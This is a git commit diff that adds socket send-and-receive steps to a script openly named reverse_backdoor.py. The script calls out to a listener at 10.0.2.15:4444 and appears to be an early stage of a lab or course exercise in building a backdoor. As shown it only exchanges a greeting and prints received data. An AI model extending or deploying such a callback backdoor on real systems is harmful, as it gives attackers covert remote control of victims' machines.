714a6719bc1532b299dab69a92827ad119711c59
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-09-30 21:49:35 -0400

    Send/Recieve Data via Sockets

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -4,3 +4,10 @@ import socket
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(("10.0.2.15", 4444))
+
+connection.send("\n[+] Connection established.\n")
+
+recieved_data = connection.recv(1024)
+print(recieved_data)
+
+connection.close()
